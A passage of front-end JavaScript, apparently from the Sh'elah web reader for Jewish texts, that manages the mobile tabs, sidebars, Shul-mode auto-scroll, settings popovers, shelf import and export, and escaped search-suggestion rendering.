                mobileBottomTabs.classList.remove('has-indicator');
                return;
            }
            indicator.style.width = `${active.offsetWidth}px`;
            indicator.style.height = `${active.offsetHeight}px`;
            indicator.style.top = `${active.offsetTop}px`;
            const firstPlacement = !mobileBottomTabs.classList.contains('has-indicator');
            mobileBottomTabs.classList.add('has-indicator');
            if (window.ShelahMotion?.slideTo) {
                window.ShelahMotion.slideTo(indicator, active.offsetLeft, { animate: animate && !firstPlacement });
            } else {
                indicator.style.transform = `translateX(${active.offsetLeft}px)`;
            }
        }

        // The search field replaces the brand + controls in the top bar while it is
        // open. Cross-fade the incoming side (opacity only: an inline transform on
        // these would re-anchor the position:fixed Hebrew date inside the controls).
        function fadeTopbarSwap(searchOpen) {
            const incoming = searchOpen ? '.topbar-search-wrap' : '.topbar-brand, #topbarControls';
            document.querySelectorAll(incoming).forEach((el) => {
                void presentEl(el, { preset: 'fade', replay: true });
            });
        }

        // True while a question asked from the search bar is loading there. The
        // phone's search is then kept open to show it, so closing it mid-question
        // (setMobileSearchExpanded) hands the wait to the panel.
        let barAskLoading = false;

        function setMobileSearchExpanded(expanded) {
            const shouldExpand = Boolean(expanded) && isMobileViewport();
            const wasOpen = document.body.classList.contains('mobile-search-open');
            const activeTab = () => mobileBottomTabs?.querySelector('.mobile-tab-active')?.dataset.mobileTab;
            // Closed by the reader while their question was still loading in it:
            // nothing on the page shows the wait any more, so the panel does.
            if (wasOpen && !shouldExpand && barAskLoading) window.ShelahConversationUI?.showPendingAnswer?.();
            document.body.classList.toggle('mobile-search-open', shouldExpand);
            if (wasOpen !== shouldExpand) fadeTopbarSwap(shouldExpand);
            if (shouldExpand) {
                closeSettingsMenu();
                if (activeTab() !== 'search') setActiveMobileTab('search');
            }
            if (!shouldExpand) {
                searchInput?.blur();
                // Search closed without picking another tab: the Search highlight
                // has nothing left to point at, so hand it back to Home.
                if (activeTab() === 'search') {
                    setActiveMobileTab('home');
                }
            }
        }

        function syncReaderTopBarOffset() {
            const topbar = document.querySelector('.topbar');
            const fallback = 63;
            let topbarOffset = fallback;
            if (topbar) {
                const measuredHeight = Math.round(topbar.offsetHeight || topbar.getBoundingClientRect().height || 0);
                if (Number.isFinite(measuredHeight) && measuredHeight > 0) {
                    topbarOffset = measuredHeight;
                }
            }
            document.documentElement.style.setProperty('--reader-topbar-offset', `${topbarOffset}px`);

            let rightSidebarOffset = topbarOffset;
            const readerActive = Boolean(reader && !reader.classList.contains('hidden'));
            if (readerActive && readerTopBar && !readerTopBar.classList.contains('hidden')) {
                const readerBarHeight = Math.max(36, Math.round(readerTopBar.getBoundingClientRect().height || 0));
                rightSidebarOffset = topbarOffset + readerBarHeight;
            }
            document.documentElement.style.setProperty('--right-sidebar-top-offset', `${rightSidebarOffset}px`);

            const viewportWidth = Math.max(Math.round(window.innerWidth || 0), 320);
            let leftGap = 0;
            let rightGap = 0;

            if (!isMobileViewport()) {
                [leftSidebar, rightSidebar].forEach((panel) => {
                    if (!panel) return;
                    const styles = window.getComputedStyle(panel);
                    if (styles.display === 'none' || panel.classList.contains('hidden')) return;

                    const rect = panel.getBoundingClientRect();
                    if (!Number.isFinite(rect.width) || rect.width < 20) return;

                    const anchoredLeft = rect.left <= 2;
                    const anchoredRight = rect.right >= (viewportWidth - 2);
                    if (anchoredLeft) {
                        leftGap = Math.max(leftGap, Math.round(rect.width));
                    }
                    if (anchoredRight) {
                        rightGap = Math.max(rightGap, Math.round(rect.width));
                    }
                });
            }

            document.documentElement.style.setProperty('--reader-topbar-left-gap', `${leftGap}px`);
            document.documentElement.style.setProperty('--reader-topbar-right-gap', `${rightGap}px`);
        }

        // On the mobile topbar grid, #hebrewDateDisplay is positioned fixed
        // (see static/style.css) so it can float in the gap between the
        // brand and #topbarControls instead of being squeezed into the
        // controls' own right-aligned, nowrap flex row. That gap's width
        // isn't fixed (auth state, language, and viewport all change it),
        // so it's measured here rather than assumed -- show the date
        // centered in whatever room actually exists, or hide it if there
        // isn't enough.
        function syncHebrewDateMobilePosition() {
            const dateEl = document.getElementById('hebrewDateDisplay');
            const brand = document.getElementById('brandHomeBtn');
            const settingsBtn = document.getElementById('settingsMenuBtn');
            if (!dateEl || !brand || !settingsBtn) return;

            if (!isMobileViewport()) {
                dateEl.style.removeProperty('display');
                dateEl.style.removeProperty('left');
                return;
            }

            dateEl.style.display = 'block';
            // Brand sits left of the settings button in LTR but right of it
            // in RTL (Hebrew mirrors the whole grid) -- compare positions
            // instead of assuming which one is which. settingsMenuBtn is
            // the first control in #topbarControls, i.e. the one right on
            // the edge of the brand/controls gap, so its own rect (not the
            // whole controls cluster's) marks the gap accurately.
            const brandRect = brand.getBoundingClientRect();
            const settingsRect = settingsBtn.getBoundingClientRect();
            const [leftBox, rightBox] = brandRect.left <= settingsRect.left
                ? [brandRect, settingsRect]
                : [settingsRect, brandRect];
            const gap = rightBox.left - leftBox.right;
            const MIN_PADDING = 12;

            if (gap < dateEl.offsetWidth + MIN_PADDING * 2) {
                dateEl.style.display = 'none';
                return;
            }

            // Sit snug next to the quick-settings button instead of the
            // logo -- hug whichever side of the gap the settings button is
            // actually on (it can be either leftBox or rightBox depending
            // on LTR/RTL), clamped so it always keeps MIN_PADDING clear of
            // the brand/logo on the far side. `left` is the element's
            // horizontal CENTER (CSS applies translate(-50%, -50%)), so
            // convert the desired edge into a center point via half-width.
            const SETTINGS_GAP = 16;
            const half = dateEl.offsetWidth / 2;
            const settingsIsLeft = leftBox === settingsRect;
            if (settingsIsLeft) {
                const maxLeftEdge = rightBox.left - MIN_PADDING - dateEl.offsetWidth;
                const leftEdge = Math.min(leftBox.right + SETTINGS_GAP, maxLeftEdge);
                dateEl.style.left = `${leftEdge + half}px`;
            } else {
                const minRightEdge = leftBox.right + MIN_PADDING + dateEl.offsetWidth;
                const rightEdge = Math.max(rightBox.left - SETTINGS_GAP, minRightEdge);
                dateEl.style.left = `${rightEdge - half}px`;
            }
        }

        function getSidebarRestoreTopOffset() {
            const readerActive = Boolean(reader && !reader.classList.contains('hidden'));
            if (!readerActive || !readerTopBar || readerTopBar.classList.contains('hidden')) {
                return 'calc(var(--topbar-height, 3.4rem) + 0.75rem)';
            }

            const readerBarHeight = Math.max(36, Math.round(readerTopBar.getBoundingClientRect().height || 0));
            return `calc(var(--reader-topbar-offset, 63px) + ${readerBarHeight}px + 0.35rem)`;
        }

        function syncReaderTopBarControls() {
            const mobile = isMobileViewport();
            const shulMode = Boolean(appState.prefs.shulMode);
            // In Shul mode the sidebar's "open" state is the transient peek flag,
            // not the persisted preference (see applySidebarVisibility()).
            const leftSidebarOpenDesktop = !mobile
                && (shulMode ? Boolean(appState.shulSidebarOpen) : (appState.prefs.showLeftSidebar !== false));
            // Check if reader is actually active (topbar is visible)
            const readerTopBar = document.getElementById('readerTopBar');
            const isReaderActive = readerTopBar && !readerTopBar.classList.contains('hidden');

            if (readerLibraryTopBarBtn) {
                // Outside Shul mode this button only reopens a closed sidebar (it
                // hides once open — nothing else closes it from here). In Shul
                // mode it is the sidebar's only control, so it stays visible and
                // toggles both ways.
                const shouldShowLibraryBtn = !mobile && (shulMode || !leftSidebarOpenDesktop);
                readerLibraryTopBarBtn.classList.toggle('hidden', !shouldShowLibraryBtn);
                readerLibraryTopBarBtn.style.visibility = shouldShowLibraryBtn ? 'visible' : 'hidden';
                readerLibraryTopBarBtn.disabled = !shouldShowLibraryBtn;
                readerLibraryTopBarBtn.setAttribute('aria-expanded', String(leftSidebarOpenDesktop));

                // Hide floating library restore button ONLY when reader is active (to avoid duplicate buttons)
                // On homepage and pages without reader, show the floating button
                if (showLeftSidebarTopBtn) {
                    showLeftSidebarTopBtn.style.display = isReaderActive ? 'none' : '';
                }
            }

            if (readerSettingsBtn) {
                readerSettingsBtn.classList.remove('hidden');
                readerSettingsBtn.style.visibility = 'visible';
                readerSettingsBtn.disabled = false;
            }
        }

        function applyMobileSidebars() {
            leftSidebar?.style.removeProperty('display');
            rightSidebar?.style.removeProperty('display');
            closeMobilePanels();
        }

        function applyDesktopSidebars(showLeft, showRight) {
            if (leftSidebar) {
                leftSidebar.classList.remove('mobile-open', 'hidden');
                leftSidebar.style.display = showLeft ? '' : 'none';
            }
            if (rightSidebar) {
                rightSidebar.classList.remove('mobile-open', 'hidden');
                rightSidebar.style.display = showRight ? '' : 'none';
            }
            mobileDrawerBackdrop?.classList.add('hidden');
            document.body.classList.remove('mobile-panel-open');
        }

        // The buttons that bring a hidden left sidebar back.
        function syncSidebarRestoreButtons({ mobile, shulMode, showLeftSidebar, readerViewActive, homeVisible }) {
            if (showLeftSidebarTopBtn) {
                const showLeftRestore = !mobile && !shulMode && !showLeftSidebar && !readerViewActive;
                showLeftSidebarTopBtn.style.display = showLeftRestore ? 'flex' : 'none';
                showLeftSidebarTopBtn.style.top = getSidebarRestoreTopOffset();
            }

            // Show topbar library button only on homepage when left sidebar is hidden on desktop
            const topbarLibraryBtn = document.getElementById('topbarLibraryBtn');
            if (topbarLibraryBtn) {
                const shouldShowLibraryBtn = homeVisible && !mobile && !shulMode && !showLeftSidebar;
                topbarLibraryBtn.style.display = shouldShowLibraryBtn ? 'inline-flex' : 'none';
            }
        }

        function applySidebarVisibility() {
            const mobile = isMobileViewport();
            const shulMode = Boolean(appState.prefs.shulMode);
            // In Shul mode the left sidebar auto-collapses and is only ever open
            // via the transient peek toggle (toggleShulLibrarySidebar()), never
            // the persisted showLeftSidebar preference -- that preference is left
            // untouched so leaving Shul mode restores exactly what it was before.
            const showLeftSidebar = shulMode
                ? Boolean(appState.shulSidebarOpen)
                : (appState.prefs.showLeftSidebar !== false);
            const readerViewActive = appState.currentView?.type === 'text';
            const homeVisible = Boolean(homeGrid && homeGrid.style.display !== 'none' && reader?.classList.contains('hidden'));
            const allowRightSidebar = readerViewActive && commentaryAvailableForCurrentSelection;
            const showRightSidebar = (appState.prefs.showRightSidebar !== false) && !homeVisible && allowRightSidebar;
            const leftHiddenDesktop = !mobile && !showLeftSidebar;
            const rightHiddenDesktop = !mobile && (!showRightSidebar || shulMode);

            if (!mobile) {
                document.body.classList.remove('mobile-search-open');
            }

            document.body.classList.toggle('left-sidebar-hidden', leftHiddenDesktop);
            document.body.classList.toggle('right-sidebar-hidden', rightHiddenDesktop);

            if (mobile) applyMobileSidebars();
            else applyDesktopSidebars(showLeftSidebar, showRightSidebar && !shulMode);

            syncSidebarRestoreButtons({ mobile, shulMode, showLeftSidebar, readerViewActive, homeVisible });

            syncReaderTopBarControls();
            syncReaderTopBarOffset();
        }

        function setSidebarVisibility(side, visible) {
            if (side === 'left') {
                appState.prefs.showLeftSidebar = Boolean(visible);
            } else if (side === 'right') {
                appState.prefs.showRightSidebar = Boolean(visible);
            }
            savePrefs();
            applySidebarVisibility();
        }

        function toggleLeftSidebar() {
            const currentlyVisible = appState.prefs.showLeftSidebar !== false;
            setSidebarVisibility('left', !currentlyVisible);
        }

        function closeSettingsMenu() {
            if (!settingsPanel) return;
            dismissEl(settingsPanel, { preset: 'popover' });
            if (settingsMenuBtn) settingsMenuBtn.setAttribute('aria-expanded', 'false');
        }

        function positionFloatingMenu(menuEl, triggerEl, options = {}) {
            // Geometry (centering under the trigger, anchoring to the shared
            // topbar's bottom edge) lives in static/js/topbar_shared.js,
            // shared with components/legal_scripts.html's own
            // positionFloatingMenu. Only the style-application step below is
            // index.html-specific (a CSS class instead of an inline
            // !important transform, so the open/close animation can still
            // drive `transform`).
            const pos = computeFloatingMenuPosition(menuEl, triggerEl, options);
            if (!pos) return;

            menuEl.style.setProperty('position', 'fixed', 'important');
            // Cancels the menus' CSS centring transform. A class, not an inline
            // !important, so the open/close animation can still drive `transform`.
            menuEl.classList.add('is-floating-menu');
            menuEl.style.setProperty('left', `${pos.left}px`, 'important');
            menuEl.style.setProperty('top', `${pos.top}px`, 'important');
            menuEl.style.setProperty('right', 'auto', 'important');
            // CSS-only fallback rules (style.css) give these a resting
            // margin-top for the case where this JS hasn't run yet — zero it
            // out here so it can't add a hidden extra gap under the `top` we
            // just computed.
            menuEl.style.setProperty('margin-top', '0', 'important');
            menuEl.style.setProperty('width', `${pos.width}px`, 'important');
            menuEl.style.setProperty('max-width', `${pos.maxWidth}px`, 'important');
        }

        function positionSettingsPanel() {
            if (!settingsPanel || !settingsMenuBtn) return;

            positionFloatingMenu(settingsPanel, settingsMenuBtn, {
                minWidth: 220,
                maxWidth: 352,
            });
        }

        function positionUserProfileMenu() {
            if (!userProfileMenu || !userProfileMenuBtn) return;

            positionFloatingMenu(userProfileMenu, userProfileMenuBtn, {
                minWidth: 112,
                maxWidth: 116,
            });
        }

        function closeUserProfileMenu() {
            if (!userProfileMenu) return;
            dismissEl(userProfileMenu, { preset: 'popover' });
            if (userProfileMenuBtn) userProfileMenuBtn.setAttribute('aria-expanded', 'false');
        }

        // Open, or on its way out (a re-tap during the exit brings it back).
        function isMenuClosed(menuEl) {
            return menuEl.classList.contains('hidden') || menuEl.classList.contains('is-hiding');
        }

        function toggleUserProfileMenu() {
            if (!userProfileMenu) return;
            const willOpen = isMenuClosed(userProfileMenu);
            if (!willOpen) {
                closeUserProfileMenu();
                return;
            }
            positionUserProfileMenu();
            presentEl(userProfileMenu, { preset: 'popover', origin: userProfileMenuBtn });
            if (userProfileMenuBtn) userProfileMenuBtn.setAttribute('aria-expanded', 'true');
            window.requestAnimationFrame(() => {
                if (!userProfileMenu.classList.contains('hidden')) {
                    positionUserProfileMenu();
                }
            });
            closeSettingsMenu();
            closeReaderSettingsPanel();
        }

        // Export works on the text open in the reader, so its row only
        // shows there.
        function syncSettingsExportControls() {
            const onText = appState.currentView?.type === 'text' && !reader?.classList.contains('hidden');
            document.getElementById('exportControls')?.classList.toggle('hidden', !onText);
        }

        function toggleSettingsMenu() {
            if (!settingsPanel) return;
            const willOpen = isMenuClosed(settingsPanel);
            if (willOpen) {
                closeReaderSettingsPanel();
                closeUserProfileMenu();
                syncSettingsExportControls();
                positionSettingsPanel();
                presentEl(settingsPanel, { preset: 'popover', origin: settingsMenuBtn });
            } else {
                dismissEl(settingsPanel, { preset: 'popover' });
            }
            if (settingsMenuBtn) settingsMenuBtn.setAttribute('aria-expanded', willOpen ? 'true' : 'false');
        }

        function closeReaderSettingsPanel() {
            if (!readerSettingsPanel) return;
            dismissEl(readerSettingsPanel, { preset: 'popover' });
            if (readerSettingsBtn) readerSettingsBtn.setAttribute('aria-expanded', 'false');
        }

        function toggleReaderSettingsPanel(forceOpen = null) {
            if (!readerSettingsPanel) return;
            const shouldOpen = typeof forceOpen === 'boolean'
                ? forceOpen
                : isMenuClosed(readerSettingsPanel);
            if (shouldOpen) {
                presentEl(readerSettingsPanel, { preset: 'popover', origin: readerSettingsBtn });
            } else {
                dismissEl(readerSettingsPanel, { preset: 'popover' });
            }
            if (readerSettingsBtn) {
                readerSettingsBtn.setAttribute('aria-expanded', shouldOpen ? 'true' : 'false');
            }
            if (shouldOpen) {
                closeSettingsMenu();
            }
        }

        function stopShulAutoScroll() {
            if (shulScrollFrame) {
                cancelAnimationFrame(shulScrollFrame);
                shulScrollFrame = null;
            }
            if (shulAutoScrollStatus) {
                shulAutoScrollStatus.classList.add('hidden');
            }
        }

        function startShulAutoScroll() {
            stopShulAutoScroll();
            if (!appState.prefs.shulMode || !appState.prefs.shulAutoScroll) return;

            if (shulAutoScrollStatus) {
                shulAutoScrollStatus.classList.remove('hidden');
            }

            let lastTs = null;
            const step = (ts) => {
                if (!appState.prefs.shulMode || !appState.prefs.shulAutoScroll) {
                    stopShulAutoScroll();
                    return;
                }

                const target = getPrimaryScrollElement();
                const maxTop = Math.max((target.scrollHeight || 0) - (target.clientHeight || window.innerHeight), 0);
                if (getPrimaryScrollTop() >= (maxTop - 2)) {
                    stopShulAutoScroll();
                    return;
                }

                if (lastTs !== null) {
                    const deltaSeconds = (ts - lastTs) / 1000;
                    const speed = Number(appState.prefs.shulScrollSpeed || 28);
                    scrollPrimaryBy(speed * deltaSeconds);
                }
                lastTs = ts;
                shulScrollFrame = requestAnimationFrame(step);
            };
            shulScrollFrame = requestAnimationFrame(step);
        }

        async function toggleShulLibrarySidebar() {
            const opening = !appState.shulSidebarOpen;
            if (opening) {
                appState.shulSidebarOpen = true;
                applySidebarVisibility();
                if (leftSidebar) await window.ShelahMotion?.slideIn(leftSidebar, { from: 'left' });
            } else {
                if (leftSidebar) await window.ShelahMotion?.slideOut(leftSidebar, { to: 'left' });
                appState.shulSidebarOpen = false;
                applySidebarVisibility();
            }
        }

        function applyShulMode() {
            const enabled = Boolean(appState.prefs.shulMode);
            document.body.classList.toggle('shul-mode', enabled);

            // Shul mode always starts with the library collapsed -- reset the
            // peek state exactly on the false->true transition, not on every
            // call. (The window-resize handler re-invokes this on every resize
            // while Shul mode stays on, and must not re-collapse a sidebar the
            // user just peeked open via toggleShulLibrarySidebar().)
            if (enabled && !shulModeWasEnabled) {
                appState.shulSidebarOpen = false;
            }
            shulModeWasEnabled = enabled;

            applySidebarVisibility();

            if (shulSubControls) {
                shulSubControls.classList.toggle('is-open', enabled);
                shulSubControls.toggleAttribute('inert', !enabled);
                shulSubControls.setAttribute('aria-hidden', String(!enabled));
            }

            if (enabled && appState.prefs.shulAutoScroll) {
                startShulAutoScroll();
            } else {
                stopShulAutoScroll();
            }
        }

        async function fetchDevtoolsHeartbeat() {
            try {
                const response = await fetch('/api/devtools/heartbeat');
                if (!response.ok) return;
                const data = await response.json();
                appState.reliability.lastHeartbeat = data.ts;
                appState.reliability.stats = data.stats || null;
                appendDevtoolsLog(`heartbeat ${JSON.stringify(data)}`);
            } catch (error) {
                appendDevtoolsLog(`heartbeat-error ${error.message}`);
            }
        }

        function openDevtoolsInspector() {
            if (!devtoolsInspectorModal) return;
            devtoolsInspectorModal.classList.remove('hidden');
            devtoolsInspectorModal.classList.add('flex');
            void fetchDevtoolsHeartbeat();
            if (inspectorPollInterval) clearInterval(inspectorPollInterval);
            inspectorPollInterval = setInterval(fetchDevtoolsHeartbeat, 15000);
        }

        function closeDevtoolsInspector() {
            if (!devtoolsInspectorModal) return;
            devtoolsInspectorModal.classList.add('hidden');
            devtoolsInspectorModal.classList.remove('flex');
            if (inspectorPollInterval) {
                clearInterval(inspectorPollInterval);
                inspectorPollInterval = null;
            }
        }

        // A base64 string holding UTF-8 text; malformed input throws, as the
        // decodeURIComponent(escape(...)) idiom this replaces did.
        function decodeBase64Utf8(encoded) {
            const bytes = Uint8Array.from(atob(encoded), (char) => char.codePointAt(0));
            return new TextDecoder('utf-8', { fatal: true }).decode(bytes);
        }

        function decodeShelfSharePayload(encoded) {
            try {
                const decoded = decodeBase64Utf8(encoded);
                return normalizeShelfShape(JSON.parse(decoded));
            } catch {
                return null;
            }
        }

        function parseShelfImportInput(rawInput) {
            const raw = String(rawInput || '').trim();
            if (!raw) return null;

            const tryJson = (value) => {
                try {
                    const parsed = JSON.parse(value);
                    return normalizeShelfShape(parsed);
                } catch {
                    return null;
                }
            };

            const tryEncoded = (value) => {
                try {
                    return decodeShelfSharePayload(decodeURIComponent(value));
                } catch {
                    return decodeShelfSharePayload(value);
                }
            };

            if (raw.startsWith('{') || raw.startsWith('[')) {
                return tryJson(raw);
            }

            if (raw.startsWith('#shelf=')) {
                return tryEncoded(raw.slice('#shelf='.length));
            }

            if (raw.includes('#shelf=')) {
                const fromInlineHash = raw.split('#shelf=')[1] || '';
                const parsed = tryEncoded(fromInlineHash);
                if (parsed) return parsed;
            }

            try {
                const maybeUrl = new URL(raw);
                const hash = maybeUrl.hash || '';
                if (hash.startsWith('#shelf=')) {
                    const parsed = tryEncoded(hash.slice('#shelf='.length));
                    if (parsed) return parsed;
                }
            } catch {
                // Not a full URL; continue fallback decoding.
            }

            const encodedParsed = tryEncoded(raw);
            if (encodedParsed) return encodedParsed;

            try {
                const decoded = decodeBase64Utf8(raw);
                const parsed = tryJson(decoded);
                if (parsed) return parsed;
            } catch {
                // Ignore; invalid legacy base64 format.
            }

            return null;
        }

        function importShelfFromPrompt() {
            const raw = window.prompt("Paste shelf JSON or shelf URL/code:", "");
            if (!raw) return;

            const shelf = parseShelfImportInput(raw);
            if (!shelf) {
                appendDevtoolsLog('shelf-import-invalid');
                window.alert(t('Could not import this shelf payload.', 'לא ניתן לייבא את מדף המקורות הזה.'));
                return;
            }

            saveShelfData(shelf);
            renderPersonalShelf();
            appendDevtoolsLog('shelf-import-success');
            window.alert(t('Shelf imported successfully.', 'המדף יובא בהצלחה.'));
        }

        function importShelfFromHashIfPresent() {
            const hash = window.location.hash || '';
            if (!hash.startsWith('#shelf=')) return;

            const code = decodeURIComponent(hash.slice('#shelf='.length));
            const shelf = decodeShelfSharePayload(code);
            if (!shelf) return;

            saveShelfData(shelf);
            renderPersonalShelf();
            history.replaceState(null, '', window.location.pathname + window.location.search);
            appendDevtoolsLog('shelf-imported-from-hash');
        }

        function removeRecentShelfItem(type, value) {
            const safeType = String(type || '').trim();
            const safeValue = String(value || '').trim();
            if (!safeType || !safeValue) return;

            const shelf = getShelfData();
            const key = `${safeType}:${safeValue}`;
            const initialLength = Array.isArray(shelf.recent) ? shelf.recent.length : 0;
            shelf.recent = (Array.isArray(shelf.recent) ? shelf.recent : []).filter((item) => `${item.type}:${item.value}` !== key);
            if (shelf.recent.length === initialLength) return;

            saveShelfData(shelf);
            renderPersonalShelf();
        }

        function buildCurrentCitationExportPayload() {
            const current = appState.currentView;
            if (current?.type !== 'text') return null;

            const title = String(current.label || current.value || '').trim();
            const ref = String(current.value || '').trim();
            const rawLines = Array.isArray(window.currentTextPayload?.lines)
                ? window.currentTextPayload.lines
                : [];
            const lines = rawLines
                .map((line, idx) => {
                    if (!line || typeof line !== 'object') return null;
                    const he = normalizeDisplayText(line.he || '');
                    const en = normalizeDisplayText(line.en || '');
                    if (!he && !en) return null;
                    return {
                        segment: String(line.segment || idx + 1),
                        he,
                        en,
                    };
                })
                .filter(Boolean);

            if (!lines.length) {
                return null;
            }

            return {
                title,
                ref,
                lines,
            };
        }

        function getSelectedExportFormat() {
            const normalized = String(exportFormatSelect?.value || 'txt').trim().toLowerCase();
            return ['txt', 'docx', 'pdf'].includes(normalized) ? normalized : 'txt';
        }

        async function exportCurrentCitation() {
            const payload = buildCurrentCitationExportPayload();
            if (!payload) {
                window.alert(t('Open a text chapter first.', 'פתח פרק טקסט לפני ייצוא.'));
                return;
            }

            const format = getSelectedExportFormat();
            if (!format) return;

            try {
                const response = await fetch('/api/export/chapter', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ ...payload, format }),
                });

                if (!response.ok) {
                    const data = await response.json().catch(() => ({}));
                    throw new Error(data?.error || `HTTP ${response.status}`);
                }

                const blob = await response.blob();
                const fileSafe = (payload.title || 'shelah-chapter').replace(/[^a-z0-9]+/gi, '-').toLowerCase();
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = `${fileSafe}.${format}`;
                document.body.appendChild(a);
                a.click();
                a.remove();
                URL.revokeObjectURL(url);

                appendDevtoolsLog(`citation-exported-${format}`);
            } catch (error) {
                window.alert(`${t('Could not export chapter:', 'לא ניתן לייצא את הפרק:')} ${error.message || error}`);
            }
        }

        function shouldShowCantillationControl() {
            const current = appState.currentView;
            if (current?.type !== 'text') return false;
            const categories = window.currentTextPayload?.categories || [];
            return categories.some((category) => ['Tanakh', 'Torah', 'Prophets', 'Writings'].includes(category));
        }

        function syncReaderSettingsVisibility() {
            if (cantillationToggleRow) {
                cantillationToggleRow.classList.toggle('hidden', !shouldShowCantillationControl());
            }
        }

        // The type-ahead list is an anchored popover like the settings/profile
        // menus: it grows out of the search field on the shared menu spring
        // and folds back into it, instead of a CSS fade that had no exit.
        // Content is cleared only once the exit has finished.
        function dismissSearchSuggestions() {
            dismissEl(searchSuggestions, {
                preset: 'popover',
                onHidden: () => {
                    if (!appState.suggestionItems.length) searchSuggestions.innerHTML = '';
                },
            });
        }

        // The list is a listbox the search field controls (WAI-ARIA combobox):
        // the highlight is aria-selected on an option, named to screen readers
        // by aria-activedescendant, while focus stays in the field.
        const suggestionOptionId = (index) => `searchOption-${index}`;

        function suggestionDisplayLabel(item, typeLabels) {
            if (item.type === 'ask') {
                const askValue = String(item.value || '').trim();
                return isHebrewMode()
                    ? `שאל את ש'אלה: ${askValue}`
                    : `Ask Sh'elah: ${askValue}`;
            }
            const baseLabel = String((isHebrewMode() ? item.label_he : item.label) || item.label || '').trim();
            const typePrefix = (item.type === 'text' || item.type === 'verse')
                ? ''
                : (typeLabels[item.type] || item.type || '');
            const hasPrefix = typePrefix
                && baseLabel.toLowerCase().startsWith(`${typePrefix.toLowerCase()} `);
            return hasPrefix ? baseLabel : `${typePrefix} ${baseLabel}`.trim();
        }

        function suggestionSubtitleHtml(item) {
            if (item.type !== 'verse') {
                const subtitle = isHebrewMode()
                    ? (item.subtitle_he || translateSuggestionSubtitle(item.subtitle, item.type))
                    : (item.subtitle || '');
                return `<div class="text-xs text-slate-500 truncate">${escapeHtml(subtitle)}</div>`;
            }
            // The verse itself, in its own language and direction, with
            // the words that matched in <mark> (text only: the server
            // sends plain-text parts, and each is escaped here).
            const lang = item.lang === 'he' ? 'he' : 'en';
            const parts = Array.isArray(item.parts) ? item.parts : [];
            const snippet = parts.map((part) => {
                const text = escapeHtml(String(part?.text || ''));
                return part?.match ? `<mark class="suggestion-verse-match">${text}</mark>` : text;
            }).join('');
            return `<div class="suggestion-verse-snippet text-xs" lang="${lang}" dir="${lang === 'he' ? 'rtl' : 'ltr'}">${snippet}</div>`;
        }

        function suggestionOptionHtml(item, index, typeLabels) {
            const isActive = index === appState.activeSuggestionIndex;
            const itemAlignClass = isHebrewMode() ? 'text-end' : 'text-start';
            const itemDir = isHebrewMode() ? 'rtl' : 'ltr';
            const displayLabel = suggestionDisplayLabel(item, typeLabels);
            const subtitleHtml = suggestionSubtitleHtml(item);

            let typeBadge = item.type === 'text' ? '' : (typeLabels[item.type] || item.type || '');
            if (item.type === 'verse' && !item.tanakh) typeBadge = typeLabels.text;
            return `
                <div role="option" id="${suggestionOptionId(index)}" aria-selected="${isActive ? 'true' : 'false'}" dir="${itemDir}"
                    class="suggestion-item w-full ${itemAlignClass} px-4 py-3 border-b border-slate-100 last:border-b-0"
                    data-index="${index}">
                    <div class="flex items-center justify-between gap-3">
                        <div class="min-w-0">
                            <div class="text-sm text-slate-800 font-medium truncate">${escapeHtml(displayLabel)}</div>
                            ${subtitleHtml}
                        </div>
                        ${typeBadge
                    ? `<span class="suggestion-badge text-[10px] uppercase tracking-widest text-slate-400">${escapeHtml(typeBadge)}</span>`
                    : ''}
                    </div>
                </div>
            `;
        }

        // Two rows the height of verse results while the verse search runs,
        // so the list does not jump when they arrive. Hidden from screen
        // readers; the status line says "Searching…" if it is slow.
        const VERSE_SKELETON_HTML = Array.from({ length: 2 }, () => `
            <div class="suggestion-skeleton px-4 py-3" aria-hidden="true">
                <span class="sk-line suggestion-skeleton-title"></span>
                <span class="sk-line suggestion-skeleton-text"></span>
            </div>`).join('');

        function verseGroupHtml(verseHtml) {
            const close = appState.verseSearch?.close;
            const heading = close
                ? t('Close matches', 'התאמות קרובות')
                : t('Verses', 'פסוקים');
            const align = isHebrewMode() ? 'text-end' : 'text-start';
            return `
                <div role="group" aria-labelledby="searchVerseHeading" class="suggestion-group">
                    <div id="searchVerseHeading" role="presentation" class="suggestion-group-heading ${align} px-4">${escapeHtml(heading)}</div>
                    ${verseHtml}
                </div>`;
        }

        function renderSearchSuggestions() {
            const verseLoading = appState.verseSearch?.state === 'loading';
            if (!appState.suggestionItems.length && !verseLoading) {
                dismissSearchSuggestions();
                return;
            }

            const typeLabels = UI_TYPE_LABELS[getCurrentLanguage()] || UI_TYPE_LABELS.en;
            const items = appState.suggestionItems;
            const options = items.map((item, index) => suggestionOptionHtml(item, index, typeLabels));
            const firstVerse = items.findIndex((item) => item.type === 'verse');
            const firstAsk = items.findIndex((item) => item.type === 'ask');
            const verseStart = [firstVerse, firstAsk].find((index) => index >= 0) ?? items.length;
            const verseEnd = firstVerse >= 0
                ? verseStart + items.slice(verseStart).filter((item) => item.type === 'verse').length
                : verseStart;
            const verseHtml = options.slice(verseStart, verseEnd).join('') || (verseLoading ? VERSE_SKELETON_HTML : '');

            searchSuggestions.setAttribute('role', 'listbox');
            searchSuggestions.setAttribute('aria-label', t('Search suggestions', 'הצעות חיפוש'));
            searchSuggestions.innerHTML = options.slice(0, verseStart).join('')
                + (verseHtml ? verseGroupHtml(verseHtml) : '')
                + options.slice(verseEnd).join('');

            const active = appState.activeSuggestionIndex;
            searchInput.setAttribute('aria-expanded', 'true');
            if (active >= 0 && active < items.length) {
                searchInput.setAttribute('aria-activedescendant', suggestionOptionId(active));
                keepOptionInView(document.getElementById(suggestionOptionId(active)));
            } else {
                searchInput.removeAttribute('aria-activedescendant');
            }

            presentEl(searchSuggestions, { preset: 'popover', origin: searchInput });
        }

        // The highlighted option scrolls into the list's own view, never the
        // page's (scrollIntoView would move the page too).
        function keepOptionInView(option) {
            if (!option) return;
            const top = option.offsetTop;
            const bottom = top + option.offsetHeight;
            if (top < searchSuggestions.scrollTop) {
                searchSuggestions.scrollTop = top;
            } else if (bottom > searchSuggestions.scrollTop + searchSuggestions.clientHeight) {
                searchSuggestions.scrollTop = bottom - searchSuggestions.clientHeight;
            }
        }

        // Escape closed the list: a reference or verse request still on its
        // way must not open it again when it answers.
        function cancelSuggestionFetch() {
            suggestionFetchSerial += 1;
            suggestionAbort?.abort();
            suggestionAbort = null;
        }

        function hideSearchSuggestions() {
            appState.suggestionItems = [];
            appState.activeSuggestionIndex = -1;
            appState.verseSearch = { state: 'idle', close: false, items: [] };
